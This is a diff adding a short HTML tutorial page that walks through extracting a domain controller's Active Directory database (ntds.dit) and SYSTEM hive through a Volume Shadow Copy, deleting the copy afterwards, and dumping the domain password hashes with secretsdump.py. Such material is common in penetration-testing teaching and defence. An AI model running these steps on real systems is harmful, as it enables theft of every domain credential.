@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Grab ADD (ntds.dit)</title>
+</head><body>Sensitive File Extraction – AD Database<br/>
+Switching gears, let’s get back to the spirit of Vshadow and use it natively for ‘living off the land’ operations. &nbsp;Since we can create snapshots with the VSS, let’s use this utility to extract the Active Directory Database (ntds.dit) on a Domain Controller (DC) and dump the hashes offline using secretsdump.py<br/>
+<br/>
+Firstly, we copy over vshadow.exe to our DC (Windows 2K12 in this example) and create a persistent shadow copy (without writers) of the “c:” using the -p parameter as follows:<br/>
+<br/>
+vshadow.exe -p -nw C:<br/>
+Note the Shadow Copy Set ID (the UUID) and Volume Name. these will be used in subsequent commands:<br/>
+<br/>
+Secondly, we copy the the AD Database from the shadow copy using the Volume name as follows:<br/>
+<br/>
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak<br/>
+<br/>
+Thirdly, we extract the SYSTEM hive from the Registry. &nbsp;We will need this to dump the contents of the AD database:<br/>
+<br/>
+reg.exe save hklm\system c:\system.bak<br/>
+<br/>
+For good measure, let’s clean up and remove our shadow copy by specifying the shadow set ID:<br/>
+<br/>
+vshadow -dx={46d3c3ee-2840-4152-ba5c-450ea401869a}<br/>
+<br/>
+Finally, let’s move our loot (ntds.dit.bak and system.bak) to dump the hashes offline with secretsdump.py. &nbsp;The following command is used:<br/>
+<br/>
+secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL<br/>
+And success! We have used Vshadow as a facilitator to acquire the domain hashes!</body></html>
